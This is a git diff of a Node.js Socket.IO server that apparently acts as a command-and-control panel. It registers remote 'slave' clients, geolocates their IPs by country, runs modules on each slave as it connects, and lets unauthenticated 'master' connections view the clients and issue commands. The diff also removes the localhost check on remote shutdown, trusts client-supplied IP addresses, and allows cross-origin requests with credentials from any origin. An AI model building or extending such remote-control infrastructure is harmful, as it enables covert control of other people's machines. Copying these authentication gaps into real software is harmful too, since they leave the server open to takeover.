@@ -7,6 +7,8 @@ let request = require("request");
 let nodeCleanup = require("node-cleanup");
 let fs = require("fs");
 let pug = require("pug");
+let os = require("os");
+let ipaddr = require('ipaddr.js');
 
 const debug = true;
 
@@ -19,6 +21,20 @@ try {
 } catch (ex) {
 	ver = "{UNKNOWN VERSION}";
 }
+
+let localIps = ["::1"];
+
+let ifaces = os.networkInterfaces();
+Object.keys(ifaces).forEach((ifname) => {
+	ifaces[ifname].forEach((iface) => {
+		if (iface.internal !== false) {
+			// skip over internal (i.e. 127.0.0.1) and non-ipv4 addresses
+			return;
+		}
+
+		localIps.push(iface.address);
+	});
+});
 
 let slaveSockets = [];
 let slaveGeo = {};
@@ -46,8 +62,8 @@ mod.getModuleSettings = () => {
 }
 Modules.importModules(mod);
 
-modulesSettings = {...defaultModulesSettings};
-serverSettings = {...defaultServerSettings};
+modulesSettings = { ...defaultModulesSettings };
+serverSettings = { ...defaultServerSettings };
 
 let control_panel_html_path = path.join(__dirname, "control_panel");
 let client_html_path = path.join(__dirname, "..", "client");
@@ -59,21 +75,21 @@ app.use(express.static(control_panel_html_path));
 // Add headers
 app.use((req, res, next) => {
 
-    // Website you wish to allow to connect
-    res.setHeader('Access-Control-Allow-Origin', '*');
+	// Website you wish to allow to connect
+	res.setHeader('Access-Control-Allow-Origin', '*');
 
-    // Request methods you wish to allow
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
+	// Request methods you wish to allow
+	res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, PATCH, DELETE');
 
-    // Request headers you wish to allow
-    res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
+	// Request headers you wish to allow
+	res.setHeader('Access-Control-Allow-Headers', 'X-Requested-With,content-type');
 
-    // Set to true if you need the website to include cookies in the requests sent
-    // to the API (e.g. in case you use sessions)
-    res.setHeader('Access-Control-Allow-Credentials', true);
+	// Set to true if you need the website to include cookies in the requests sent
+	// to the API (e.g. in case you use sessions)
+	res.setHeader('Access-Control-Allow-Credentials', true);
 
-    // Pass to next layer of middleware
-    next();
+	// Pass to next layer of middleware
+	next();
 });
 
 io.origins((orig, call) => call(null, true));
@@ -90,7 +106,7 @@ app.use("/client", express.static(client_html_path));
 
 Modules.getAllModules().forEach(module => {
 	if (module.widgetPaths[0]) {
-		app.use("/"+module.name, express.static(path.resolve(path.parse(module.widgetPaths[0]).dir)));
+		app.use("/" + module.name, express.static(path.resolve(path.parse(module.widgetPaths[0]).dir)));
 	}
 });
 
@@ -105,7 +121,7 @@ app.get("/modules", (req, res) => {
 			}));
 		});
 	});
-	
+
 	res.render("modules", {
 		autoRunListModules: Modules.getAllModules().filter(module => module.isAutoRun),
 		modulesSettings: modulesSettings,
@@ -115,8 +131,10 @@ app.get("/modules", (req, res) => {
 });
 
 io.on("connection", (socket) => {
-	let ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress).address || "localhost";
-	socket.ip = ip;
+	socket.ip = (socket.handshake.headers["x-forwarded-for"] || socket.request.connection.remoteAddress);
+
+	let ipP = ipaddr.parse(socket.ip);
+	if (ipP.range() == "ipv4Mapped") socket.ip = ipP.toIPv4Address().toString();
 
 	socket.debugExecFunc = debug;
 
@@ -128,25 +146,33 @@ io.on("connection", (socket) => {
 
 			if (slaveGeo[socket.country].length == 0)
 				slaveCountries.pop(socket.country);
-				
-			console.log("Slave disconnected ("+socket.ip+")");
+
+			console.log("Slave disconnected (" + socket.ip + ")");
 		} else {
-			console.log("Master disconnected ("+socket.ip+")");
+			console.log("Master disconnected (" + socket.ip + ")");
 		}
 	});
-	
+
 	//TODO: Crypto validation on master connection
-	socket.on("postConnection", (mode) => {
+	socket.on("postConnection", (mode, ip) => {
 		socket.mode = mode;
+		socket.ip = ip ? ip : socket.ip;
+
 		if (mode === "slave") {
 			slaveSockets.push(socket);
-								
-			request("http://www.geoplugin.net/json.gp?ip="+ip, (error, response, body) => {
+
+			console.log("New slave connection from: " + socket.ip);
+
+			modulesSettings.onConnectModules.forEach((name) => {
+				Modules.getModule(name).exec(socket);
+			});
+
+			request("http://www.geoplugin.net/json.gp?ip=" + ip, (error, response, body) => {
 				let json = JSON.parse(body);
 
-				if (slaveGeo[json["geoplugin_countryName"]] == null) 
+				if (slaveGeo[json["geoplugin_countryName"]] == null)
 					slaveGeo[json["geoplugin_countryName"]] = [];
-					
+
 				slaveGeo[json["geoplugin_countryName"]].push(ip);
 
 				socket.country = json["geoplugin_countryName"];
@@ -154,20 +180,15 @@ io.on("connection", (socket) => {
 				if (slaveCountries.indexOf(socket.country) == -1)
 					slaveCountries.push(socket.country);
 			});
-			console.log("New slave connection from: "+ ip);
-
-			modulesSettings.onConnectModules.forEach((name) => {
-				Modules.getModule(name).exec(socket);
-			});
 		} else if (mode === "master") {
 			socket.on("updateClientData", () => {
-				
+
 				let data = [];
-				
+
 				for (let i = 0; i < slaveCountries.length; i++) {
 					data[i] = [slaveCountries[i], slaveGeo[slaveCountries[i]].length];
 				}
-				
+
 				socket.emit("getClientsData", data, slaveGeo);
 			});
 
@@ -181,9 +202,7 @@ io.on("connection", (socket) => {
 			});
 
 			socket.on("shutdown", () => {
-				if (ip === "localhost") {
-					process.exit();
-				}
+				process.exit();
 			});
 
 			Modules.getAllModules().forEach(module => {
@@ -194,10 +213,10 @@ io.on("connection", (socket) => {
 				});
 			});
 
-			console.log("New master connection from: "+ ip);
+			console.log("New master connection from: " + socket.ip);
 		}
 	});
-	
+
 });
 
 function onShutdown(exitCode, signal) {
@@ -205,7 +224,7 @@ function onShutdown(exitCode, signal) {
 }
 
 function saveSettings(callback) {
-	
+
 	modulesSettings = Object.assign(defaultModulesSettings, modulesSettings);
 	serverSettings = Object.assign(defaultServerSettings, serverSettings);
 
@@ -217,7 +236,7 @@ function saveSettings(callback) {
 
 		if (callback) callback();
 	});
-	
+
 }
 
 function loadSettings(callback) {
@@ -239,9 +258,9 @@ function loadSettings(callback) {
 loadSettings(() => {
 
 	http.listen(serverSettings.port, () => {
-		console.log("listening on *:"+serverSettings.port);
-		console.log("Control panel: http://localhost:"+serverSettings.port+"/");
-	
+		console.log("Listening on *:" + serverSettings.port);
+		console.log("Control panel: http://localhost:" + serverSettings.port + "/");
+
 		nodeCleanup(onShutdown);
 	});
 
